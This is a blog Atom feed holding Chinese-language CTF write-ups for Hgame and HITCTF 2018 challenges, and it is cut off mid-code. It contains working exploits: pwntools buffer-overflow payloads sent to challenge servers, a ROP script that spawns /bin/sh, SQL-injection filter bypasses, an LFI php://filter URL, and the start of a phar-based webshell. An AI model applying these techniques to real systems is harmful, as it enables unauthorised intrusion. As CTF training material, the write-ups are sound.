<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-02-07T05:16:57.679Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hgame pwn</title>
    <link href="http://yoursite.com/2018/02/07/Hgame-pwn/"/>
    <id>http://yoursite.com/2018/02/07/Hgame-pwn/</id>
    <published>2018-02-07T05:07:14.000Z</published>
    <updated>2018-02-07T05:16:57.679Z</updated>
    
    <content type="html"><![CDATA[<p>Hgame几题简单的pwn，不太难，有点意思，简单写写。</p><h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>虽然开了canary，但是只要输入的东西覆盖到随机数，判断一样就cat flag了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p><p>计算一下输入位置和随机数的距离，输入一堆’1’*276，<code>atoi</code>会将输入转成0x7fffffff。那么payload：<code>python -c &quot;from pwn import *;print &#39;1&#39;*276+p32(0x7fffffff)&quot; |nc 111.230.149.72 10002</code></p><h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>虽然限制了username长度，可以输入负数直接绕过，然后输入一大堆’1’，将v10覆盖了就OK。</p><h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>神经病题目~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p><p>广告词和flag都读到bss段了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>只要将s覆盖成flag的地址就可以，不用计算距离，直接干！payload：<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Hgame几题简单的pwn，不太难，有点意思，简单写写。&lt;/p&gt;
&lt;h3 id=&quot;guess-number&quot;&gt;&lt;a href=&quot;#guess-number&quot; class=&quot;headerlink&quot; title=&quot;guess_number&quot;&gt;&lt;/a&gt;guess_number&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HITCTF2018-writeup</title>
    <link href="http://yoursite.com/2018/02/05/HITCTF2018-writeup/"/>
    <id>http://yoursite.com/2018/02/05/HITCTF2018-writeup/</id>
    <published>2018-02-05T01:12:04.000Z</published>
    <updated>2018-02-05T01:13:54.627Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easy-xor-apk"><a href="#easy-xor-apk" class="headerlink" title="easy_xor.apk"></a>easy_xor.apk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'kmqgwg]Tm3=NE_/4ouKJW@WE^'</span></span><br><span class="line">b=<span class="string">'#$%$#!&amp;#^_^~(:p@_*#######'</span></span><br><span class="line">c = [chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><p>简单xor即可：HITCTF{w3lc0me_t0_hitctf}</p><h3 id="stackflow"><a href="#stackflow" class="headerlink" title="stackflow"></a>stackflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单栈溢出后ROP，程序自带可以<code>cat flag</code>的函数，其实也可以用<code>system(&#39;/bin/sh\0&#39;)</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  command = <span class="string">"cat flag"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xC0FFEE</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意<code>bss</code>中有<code>stdout</code>参数，不能直接写<code>bss+4</code>的位置，<code>fflush(stdout)</code>会报错<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">target = <span class="string">'stackoverflow'</span>  </span><br><span class="line">remote_addr = <span class="string">'pwn.sniperoj.cn'</span></span><br><span class="line">remote_port = <span class="number">30006</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./'</span>+target)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">offset= <span class="number">44</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x804A04c</span>  <span class="comment">#bss+12</span></span><br><span class="line"><span class="comment">#payload = offset*'a' + p32(flag_addr) + p32(0) +p32(0xdeadbeef)+p32(0xc0ffee)</span></span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(read_addr) + p32(vuln_addr) +p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">'/bin/sh\0'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(sys) + p32(vuln_addr)+p32(bss)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    flag = file.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        flag = base64.b64encode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = base64.b32encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(flag)</span><br></pre></td></tr></table></figure><p>20次随机base64或base32编码，手工一下就行了</p><h3 id="单表替换"><a href="#单表替换" class="headerlink" title="单表替换"></a>单表替换</h3><p>手工替换即可，注意俄文也有分大小写的，原文是Gone with the wind</p><h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br></pre></td></tr></table></figure><p>弱类型绕过<code>passwd</code>的判断，用<code>with rollup</code>；由于过滤了<code>limit</code>，可以用<code>having passwd is null</code>解决。</p><h3 id="学习资料的密码"><a href="#学习资料的密码" class="headerlink" title="学习资料的密码"></a>学习资料的密码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Give me your key:"</span>);</span><br><span class="line">v7 = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x32</span>u);</span><br><span class="line">myRead(v7);</span><br><span class="line">v6 = basen(v7);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, &amp;v4) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've got my base :)"</span>);</span><br></pre></td></tr></table></figure><p>题目提供了加密后的flag，程序对输入进行运算后与加密内容比较，看看加密算法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v19 - v19 % <span class="number">3</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v22;</span><br><span class="line">    v2 = v22 + <span class="number">1</span>;</span><br><span class="line">    v20[v1] = chart[(a1[i] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v3 = v2++;</span><br><span class="line">    v20[v3] = chart[(a1[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v4 = v2++;</span><br><span class="line">    v20[v4] = chart[<span class="number">2</span> * a1[i] &amp; <span class="number">6</span> | (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>];</span><br><span class="line">    v5 = v2++;</span><br><span class="line">    v20[v5] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v6 = v2++;</span><br><span class="line">    v20[v6] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v7 = v2++;</span><br><span class="line">    v20[v7] = chart[<span class="number">4</span> * a1[i + <span class="number">1</span>] &amp; <span class="number">4</span> | (a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>];</span><br><span class="line">    v20[v2] = chart[(a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v8 = v2 + <span class="number">1</span>;</span><br><span class="line">    v22 = v2 + <span class="number">2</span>;</span><br><span class="line">    v20[v8] = chart[a1[i + <span class="number">2</span>] &amp; <span class="number">7</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>重点在这段代码，算法是将3为明文转换成8位，多出来的位运算后面还有，但不重要。密文是67位，67%8=3，重点解决前面22位OK了。算法不难，可以直接进行每3位爆破，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="string">'llW00ml0lWeml3Weceec3m03c0e!0mc!cW0cl3ecc3lm!0eccllecmmWcmWcmWm3c!l'</span></span><br><span class="line">chart = <span class="string">'W3lc0me!'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">5</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">2</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">2</span> * ord(s[<span class="number">0</span>]) &amp; <span class="number">6</span> | (ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">4</span> * ord(s[<span class="number">1</span>]) &amp; <span class="number">4</span> | (ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[ord(s[<span class="number">2</span>]) &amp; <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                t = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> f(t) == a1[n*<span class="number">8</span>:n*<span class="number">8</span>+<span class="number">8</span>]:</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    flag += foo(_)</span><br><span class="line">    <span class="keyword">print</span> flag   <span class="comment">#HITCTF&#123;3asy_b4se_3ight:)&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>主页存在文件包含，可查看源代码<br><code>http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login</code></p><p>login.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;CTF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">  ç»éè§£éæ´å¤åè½</span><br><span class="line">  &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    ç¨æ·å : &lt;input name=<span class="string">"username"</span> placeholder=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    å¯ç  : &lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"ç»é"</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">          $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">          $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">          file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>包含config.php有admin的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$admin_hash = &quot;df650edd89a1abfb417124133daf4c103e6d2e97&quot;;</span><br></pre></td></tr></table></figure></p><p>思路：你用输入的username和password，写入log，然后文件包含，本题中间用了<code>=&gt;</code>做连接，预期解法用phar。需要修改php.ini的配置，去掉<code>phar.readonly</code>注释并改成off</p><p>1.phar生成时，php文件带有<code>=&gt;</code>关键字，建一个c文件夹，里面放一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'c.phar'</span>, <span class="number">0</span>, <span 